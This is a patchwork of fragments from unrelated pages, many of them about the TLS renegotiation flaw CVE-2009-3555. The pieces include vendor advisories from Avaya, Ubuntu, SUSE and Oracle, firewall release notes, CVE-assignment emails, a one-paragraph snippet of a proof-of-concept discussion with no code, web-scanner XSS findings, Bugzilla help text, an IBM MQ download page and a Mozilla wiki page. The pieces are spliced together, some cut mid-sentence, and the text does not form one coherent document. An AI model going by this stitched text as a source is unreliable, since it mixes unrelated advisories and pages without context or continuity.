  The ability to rate the possible exploitation of vulnerabilities is an evolving science, and new techniques for exploitation in general, or unique techniques specific to a vulnerability, or new trends in detected exploits of particular products may be discovered that could change the Exploitability Index rating. However, the goal of the Exploitability Index is to help customers prioritize those updates for the most current monthly release. Therefore, if there is information that would change an assessment released in the first month of a security release, Microsoft will update the Exploitability Index. If information becomes available in subsequent months, after most customers have made their prioritization decisions, the Exploitability Index will not be updated as it is no longer useful to the customer. When an Exploitability Index rating is corrected in a way that reflects increased risk to customers, the security update revision is incremented at a major version number (for instance, from 1.0 to 2.0). When risk is adjusted downwards, the update revision is incremented at a minor version number (for instance, from 1.0 to 1.1).
* ### How does the Exploitability Index relate to the Common Vulnerability Scoring System (CVSS) and other rating systems?

  The Exploitability Index is separate and not related to other rating systems. However, the MSRC is a contributing member to the Common Vulnerability Scoring System (CVSS), and Microsoft shares its experience and customer feedback in building and releasing the Exploitability Index with the working group in order to help ensure the CVSS is effective and actionable.

Transport Layer Security Renegotiation Vulnerability

Original Release Date: December 9, 2009

Last Revised: January 4, 2011

Number: ASA-2009-548

Risk Level: Low

Advisory Version: 2.0

Advisory Status: Final

---

## 1. Overview:

A vulnerability in the Transport Layer Security (TLS) and
Secure Sockets Layer (SSL) protocols has been discovered which could
allow someone to inject themselves into an authenticated TLS/SSL communications
path as part of a man-in-the-middle attack. This would allow an
attacker to inject arbitrary content as the client, which would then be
treated by the server as if the data was from the client.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has
assigned the name
[CVE-2009-3555](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555)
to this issue.

Various Avaya system products are vulnerable, as they use TLS/SSL
in components such as Web services, VoIP communication and other
services. Due to the limited conditions that must exist for this issue
to be taken advantage of, Avaya has classified this as a Low risk vulnerability.

This advisory has been updated with links to existing Avaya Security Advisories
that cover Operating System and third party vendor fixes to TLS/SSL services
utilized by Avaya products. Since this vulnerability is at the protocol level,
affected Avaya products will continue to update any fixed TLS/SSL libraries as
they become available from Operating System and third party vendors.
Please refer to new Avaya Security Advisories covering related TLS/SSL vulnerabilities
should they be released in the future.

**Recommended Actions for System Products:**

Avaya strongly recommends that customers follow
networking and security best practices by implementing
firewalls, ACLs, physical security or other appropriate
access restrictions. Though Avaya believes such
restrictions should always be in place; risk to Avaya's
product and the surrounding network from this potential
vulnerability may be mitigated by ensuring these
practices are implemented until such time as a product
update is available. Further restrictions as deemed
necessary based on the customer's security policies
may be required during this interim period.

| |  | | | --- | --- | | UpgradesRelease notice for Ingate Firewall® 4.8.1 and Ingate SIParator® 4.8.1  | Release name: | Ingate Firewall® 4.8.1 Ingate SIParator® 4.8.1 | | --- | --- |   The new version can be found [here](/Upgrades.php)  ```  Release notice for Ingate Firewall(R) 4.8.1 and Ingate SIParator(R) 4.8.1  Release name: Ingate Firewall(R) 4.8.1               Ingate SIParator(R) 4.8.1 Release date: November 26, 2009  The new version and User Manuals can be found at: http://www.ingate.com/Upgrades.php  This is a major release with many new features, bug fixes and security fixes. We recommend everybody to upgrade.  * General change  *** "Firewall" and "SIParator" product operation are now user-     selectable through web GUI, CLI and startup tool. [Tracking ID:     3507]. Switching between Firewall and SIParator is now user      configurable on the SIParator Type page in the Web GUI, or      through the Start-Up Tool.  * New SIP-related features  *** Embedded SIP Test Agent. Test calls are manually initiated or     scheduled for periodic tests. A call is considered successful if     200 OK is received and at least 4 media packets are sent and     received.  [Tracking ID: 4125]  *** Embedded SIP Test Agent - Echo Server. An echo server listening to     a configured address answers all incoming calls and echoes back     the media. Hosts/networks allowed to access the Echo Server are     configurable. This feature is intended for usage with the embedded     Test Agent or any other test tool.  [Tracking ID: 4129]  *** Estimated MOS values are calculated for RTP streams. A MOS value     (0-5) is estimated for each call and sent in the RADIUS STOP     ticket. The MOS values are estimated based on CODEC (type,     parameters) and packet loss (distribution taken into     account).      New RADIUS attributes:     - IG-Acct-Input-Last-Payload-Type  Number describing CODEC used     - IG-Acct-Output-Last-Payload-Type     - IG-Acct-Input-Reordered          No of re-ordered RTP packts     - IG-Acct-Output-Reordered     - IG-Acct-Input-Comfort-Noise      Comfort Noise used (yes/no)     - IG-Acct-Output-Comfort-Noise     - IG-Acct-Input-Codec-Name         Name of CODEC used (e.g PCMU)     - IG-Acct-Output-Codec-Name     - IG-Acct-Input-Jitter-Max         Maximum jitter during the call     - IG-Acct-Output-Jitter-Max     [Tracking ID: 4269]  *** Additional attributes in RADIUS accounting messages. The following     additional SIP headers in the initial SIP INVITE will be reported     by the Ingate:      - Remote-Party-Id     - P-Asserted-Identity     - Diversion      The value of the header field will be sent as "raw" unformatted data.      (In cases of several similar headers, the first will be reported.      [Tracking ID: 4458]  *** Wildcard patterns can be used for domains in DNS override. Only     patters starting with * are supported. [Tracking ID: 4226]  *** Rewriting FROM-header in the Dial-Plan. Rewrite of the From header     is enabled by adding a ";from=" parameter to the Forward To Reg     Expr field in the same way ";b2bua" can be used today.      The from parameter may contain references to Reg Expr sub-strings     in "Forward To", except the string may both reference sub strings     in "From Header", and Request-URI Reg Exprs. Sub strings of the     From header are referenced as $fx, x >= 0. And Request-URI sub     strings as $rx, x >= 0.      The from parameter may also contain the following references "$()":     - ruri.user     - ruri.host     - to.user     - to.host     - from.user     - from.host     - ip.      Where iface is the name of a network interface, i.e. one of eth0,     eth1 etc.      Examples:      1) Replace From domain with IP of interface eth1:        from="$(from.user)@$(ip.eth1)"      2) Replace From domain with example.com:        from="$(from.user)@example.com"     [Tracking ID: 2765]  *** "Refer-To replacement domain" is used in attended transfers     too. This was a new feature in 4.7.0, which replaces the domain in     Refer-To headers of REFER requests for unattended transfers. In     4.8 this behaviour can be used in attended transfers too.      The Refer-To headers of REFER for attended transfers normally     contain the remote target of a dialog which don't need this     setting. But some SIP devices use an AOR in the Refer-To header     for attended transfers.  [Tracking ID: 4394]  *** Wildcard matching of TLS certificates according to RFC 2818. It is     now supported to use wildcard matching of subjectAltName and CN in     TLS certificates. [Tracking ID: 4224]  *** Fake support of "privacy" option tag. "privacy" is added as a     supported options tag. And as a result the sip module will forward     requests containing "Proxy-Require: privacy". The headers     Remote-Party-ID and RPID-Privacy are forwarded by the proxy, but     otherwise ignored.      In the case of the B2BUA, both Proxy-Require and Remote-Party-ID     are removed (but RPID-Privacy is kept) before the requests are     forwarded.  [Tracking ID: 4460]  *** INFOs with Content-Type application/media_control+xml are ignored     by the B2BUA and responses with 200 (OK) are sent.  [Tracking ID:     4456]  *** 491 (Request Pending) to Re-INVITEs are delayed on one call leg,     if an outgoing Re-INVITE has been sent on the other leg. Instead     the Ingate will wait some time before responding to allow a pending     request on the other leg to complete.  [Tracking ID: 4384]  *** Improved interoperability between RFC 2543 and RFC 3264 peers     regarding onhold. Ingate complies with RFC 3264 and answers an SDP     containing "inactive" with an SDP containing "inactive" even if the     other peer didn't include the "inactive" (RFC 2543).  [Tracking     ID: 4390]  *** New re-INVITEs are now delayed until an ACK is received from       the previous re-INVITE.  [Tracking ID: 4229]  * Other new features  *** An SNMP trap is sent when time-limited licenses expire.     Tracking ID: 4263   * Fixed Security problems  *** Fixed two remotely exploitable bugs in the ASN.1 parser of     Openswan. This is CVE-2009-2185 and is fixed in Openswan 2.4.15.     [Tracking ID: 4356]  *** The Bonk attack (aka ping of death) was not satisfactorily      handled according to ICSA.     [Tracking ID: 4312]  *** Fixed man-in-the-middle vulnerability for SSL and TLS by     disabling renegotiations. This is CVE-2009-3555.     [Tracking ID: 4471]  * Fixed SIP-related bugs  *** The B2BUA unexpectedly changed the From URI when NAT:ing as an     alias address.  [Tracking ID: 4252]  *** The SIP module failed to start if a static route was configured to     a network behind a router on a VLAN unless the physical ethernet     interface also was configured with an IP address.  [Tracking ID:     4397]  *** Route header was not removed in retransmission of stateless ACK     (2xx) [Tracking ID: 4402]  * Fixed CLI-related bugs  *** The reboot-command uploaded via the GUI in a CLI file containing     "reboot --now" works as expected.  [Tracking ID: 4465]  * Other  *** The Mediator mode for the Ingate SIParator(R) has been removed and     is no longer supported.

patch management stack will detect which updates are required and
automatically perform the necessary steps to verify and install them.
Alternatively, download the update packages for your distribution manually
and verify their integrity by the methods listed in Section 6 of this
announcement. Then install the packages using the command
rpm -Fhv <file.rpm>
to apply the update, replacing <file.rpm> with the filename of the
downloaded RPM package.
Our maintenance customers are notified individually. The packages are
offered for installation from the maintenance web:

6) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file where you saved the
announcement. The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and the integrity of
a package needs to be verified to ensure that it has not been tampered
with.
The internal rpm package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on
RPMv4-based distributions) and the gpg key ring of 'root' during
installation. You can also find it on the first installation CD and at
the end of this announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Let's use CVE-2009-3898 for this one:

CVE-2009-3898

nginx versions before 0.8.17 and 0.7.63 contain a directory traversal flaw in
the webdav component. A user who can COPY or MOVE permissions could place
files outside the webdav root.

We'll use the same ID. mod_ssl did a similar thing and used CVE-2009-3555. I
think multiple IDs in this instance would actually create more confusion that
it would solve.

Thanks.

### Overview

The Oracle products and components listed above are affected by multiple vulnerabilities. The impacts of these vulnerabilities include remote execution of arbitrary code, information disclosure, and denial of service.

The [Oracle Critical Patch Update Advisory - October 2010](http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html) addresses 85 vulnerabilities in various Oracle products and components, including 31 vulnerabilities in Sun products. The Advisory provides information about affected components, access and authorization required for successful exploitation, and the impact from the vulnerabilities on data confidentiality, integrity, and availability.

Oracle has associated CVE identifiers with the vulnerabilities addressed in this Critical Patch Update. More detail about one of the vulnerabilities is available in US-CERT Vulnerability Note [VU#174089](http://www.kb.cert.org/vuls/id/174089).

The Oracle Siebel Suite Executive Summary section of the Oracle Advisory notes, "None of these vulnerabilities may be remotely exploitable without authentication, i.e., none may be exploited over a network without the need for a username and password." A system with the Siebel Option Pack for IE ActiveX control installed on it can be attacked remotely by an unauthenticated attacker by enticing the user to access a specially crafted HTML file (most likely a web site controlled by the attacker).

### Impact

The impact of these vulnerabilities varies depending on the product, component, and configuration of the system. Potential consequences include the execution of arbitrary code or commands, information disclosure, and denial of service. Vulnerable components may be available to unauthenticated, remote attackers. An attacker who compromises an Oracle database may be able to access sensitive information.

### Solution

Apply the appropriate patches or upgrade as specified in the [Oracle Critical Patch Update Advisory - October 2010](http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html). Note that this document only lists newly corrected issues. Updates to patches for previously known issues are not listed.

# USN-927-5: nspr update

29 June 2010

This update is for use with the new NSS provided in USN-927-4.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 8.04](/security/notices?release=hardy)

## Packages

* [nspr](/security/cves?package=nspr) - NetScape Portable Runtime Library

## Details

USN-927-4 fixed vulnerabilities in NSS. This update provides the NSPR

needed to use the new NSS.

Original advisory details:

Marsh Ray and Steve Dispensa discovered a flaw in the TLS and SSLv3

protocols. If an attacker could perform a machine-in-the-middle attack at the

start of a TLS connection, the attacker could inject arbitrary content at

the beginning of the user's session. This update adds support for the new

new renegotiation extension and will use it when the server supports it.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 8.04

* [libnspr4-0d](https://launchpad.net/ubuntu/%2Bsource/nspr)
  -
  [4.8-0ubuntu0.8.04.1](https://launchpad.net/ubuntu/%2Bsource/nspr/4.8-0ubuntu0.8.04.1)

After a standard system upgrade you need to restart any applications that

use NSPR, such as Firefox, to effect the necessary changes.

SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.

Subject: CVE-2009-3555 for TLS renegotiation MITM attacks

<http://extendedsubset.com/?p=8>
<http://www.ietf.org/mail-archive/web/tls/current/msg03948.html> and so on
<https://bugzilla.redhat.com/show_bug.cgi?id=533125>

Marsh Ray of PhoneFactor has discovered a flaw in the TLS/SSL protocol
related to the handling of the session renegotiations.  In certain
circumstances this flaw could be used in MITM attacks, allowing an
attacker to inject attacker-chosen plain text prefix into a secure session
of the victim.

Thanks, Mark

Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

# Re: SSL/TLS MiTM PoC

```
This flaw has been considered as unlikely to be exploited for HTTPS,
as it only allows the attacker to inject prefixes. By changing the
"trick" given by Marsh Ray, the attacker can increase his
possibilities. More detail, and an example of the use of a slightly
modified version of this PoC to steal twitter credentials over an SSL

# MS81: IBM MQ Internet Pass-Thru

### Download

## Abstract

IBM MQ Internet Pass-Thru is an IBM MQ base product extension that can be used to implement messaging solutions between remote sites across the internet.

## Download Description

**Please note:**

**IBM MQ Internet Pass-Thru (MQIPT) is now an optional component of IBM MQ. The latest versions of MQIPT are available on** **[FixCentral](https://ibm.biz/mq94ipt).**

**The MQIPT SupportPac (MS81) has been withdrawn. The SupportPac reached end of support on 30th September 2020.**

**If you are using MQIPT 2.1 or earlier, you are encouraged to upgrade to MQIPT for IBM MQ 9.4.**

IBM MQ Internet Pass-Thru (MQIPT) makes the passage of IBM MQ channel protocols into and out of a firewall simpler and more manageable, by tunnelling the protocols inside HTTP or by acting as a proxy.

For information about new features and changes in MQIPT, see What's new and changed in the [IBM MQ Documentation](https://www.ibm.com/docs/en/ibm-mq).

**Details**

Category: 3

Original Release: 11th Jul 2000

End of Support: 30th Sep 2020

## Technical Support

Category 3 IBM WebSphere MQ (MQSeries) SupportPacs are supplied under the standard terms and conditions provided by the International Program License Agreement (IPLA) and thus carry program defect service.

Please read the licence files that accompany the SupportPac to ensure you understand the conditions under which the SupportPac is provided.

If you encounter what you believe to be a defect with the SupportPac you can request Program Services by reporting the problem through the same defect reporting channel you employ for the IBM WebSphere MQ or MQSeries server product(s) on which you are using the SupportPac.

Shouldn't this be credited to Martin Rex from SAP?  He's the first one
who publicly comitted to this vulnerability.  (And I'm slightly
surprised by the rapid me-too-ing that's going on here.)

Anyway, is the CVE just for HTTP over TLS, or more?

> I like the fact that they really dig into things and then provide answers. As the single Linux guy, I kind of need that second admin next to me sometimes to say, "Hey, what about this?" and I am able to do that through the portal. I get my questions answered and trouble tickets resolved.

| Description | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user. Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser. | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Impact | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them. An attacker can steal the session cookie and take over the account, impersonating the user. It is also possible to modify the content of the page presented to the user. | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Recommendation | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| Your script should filter metacharacters from user input. | | | | | | | | | | | | | | | | | | | |

|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| A vulnerability in the way SSL and TLS protocols allow renegotiation requests may allow an attacker to inject plaintext into an application protocol stream. This could result in a situation where the attacker may be able to issue commands to the server that appear to be coming from a legitimate source. This issue affects SSL version 3.0 and newer and TLS version 1.0 and newer. | | | | | | | | | | | | | | | | | | | |

| Description | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| When a new name and password is entered in a form and the form is submitted, the browser asks if the password should be saved. Thereafter when the form is displayed, the name and password are filled in automatically or are completed as the name is entered. An attacker with local access could obtain the cleartext password from the browser cache. | | | | | | | | | | | | | | | | | | | |

| Recommendation | | | | | | | | | | | | | | | | | | | |
|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| The password autocomplete should be disabled in sensitive applications. To disable autocomplete, you may use a code similar to: <INPUT TYPE="password" AUTOCOMPLETE="off"> | | | | | | | | | | | | | | | | | | | |

# BMO/UserGuide/Whiteboard

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)

Each bug has a free-form single line text entry box for adding tags and status information. This wiki page is dedicated to collect a comprehensive list of whiteboard tags used in the Mozilla project.

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

## Releases

* [Ubuntu 9.10](/security/notices?release=karmic)

## Packages

* [nss](/security/cves?package=nss) -

## Details

Marsh Ray and Steve Dispensa discovered a flaw in the TLS and SSLv3

protocols. If an attacker could perform a machine-in-the-middle attack at the

start of a TLS connection, the attacker could inject arbitrary content at

the beginning of the user's session. This update adds support for the new

new renegotiation extension and will use it when the server supports it.

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- OpenOffice\_org
